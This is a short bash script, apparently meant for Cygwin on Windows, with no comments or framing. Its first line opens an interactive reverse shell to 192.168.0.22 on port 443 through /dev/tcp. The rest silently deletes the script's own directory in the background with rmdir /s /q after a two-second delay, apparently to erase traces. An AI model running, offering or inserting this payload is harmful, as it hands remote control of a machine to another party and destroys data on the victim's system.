#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

WIN_DIR=$(cygpath -w "$PWD")

cd ..


cmd.exe /c "timeout /t 2 /nobreak >nul && rmdir /s /q \"$WIN_DIR\"" >/dev/null 2>&1 &
